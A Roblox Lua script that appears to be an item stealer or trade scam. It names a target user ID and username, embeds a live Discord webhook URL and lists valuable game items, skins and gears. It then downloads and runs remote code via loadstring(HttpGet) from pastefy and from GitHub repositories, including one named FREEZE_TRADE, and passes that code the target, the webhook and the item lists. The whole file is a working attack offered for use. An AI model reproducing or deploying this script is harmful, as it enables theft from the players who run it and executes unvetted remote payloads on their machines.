local TARGET_ID = 11936010911
local TARGET_USER = "juniordograu155"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1574939337571835994/BydX-oxPYVYrtvFzpLg3P6LVxgbuSlpM5THab2z-9oDZSnK37L_GpiTnRaOQq31oEnTZ"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Gold and Diamond"] = true,
    ["La Craft Machine"] = true,
    ["Los Dragons"] = true,
    ["Orchidox"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Hydra Serpent"] = true,
    ["Plant Bros"] = true,
    ["Phoenix"] = true,
    ["Dragon Skeletonini"] = true,
    ["4th Bros"] = true,
    ["Bufalino Boomberino"] = true,
    ["Money Money Bros"] = true,
    ["Caylusaurus"] = true,
    ["Rhino Helicopterino"] = true,
    ["Steakini Fattini"] = true,
    ["Centrucci Nuclucci"] = true,
    ["Sammyni Cakini"] = true,
    ["Los Hackers"] = true,
    ["John Doe"] = true,
    ["Ginger Cisterna"] = true,
    ["Jelly Moby"] = true,
    ["Bearito Cabinito"] = true,
    ["Digi Narwhal"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["25"] = true,
    ["1x1x1x1"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Celestial Pegasus"] = true,
    ["Cash or Card"] = true,
    ["Chipso and Queso"] = true,
    ["Cooki and Milki"] = true,
    ["DJ Panda"] = true,
    ["Eviledon"] = true,
    ["Esok Sekolah"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Garama and Madundung"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Ginger Gerat"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Cupid's Wings"] = true,
    ["Blackhole Bomb"] = true,
    ["Alien Slap"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true,
    ["Skeleton Dragon"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)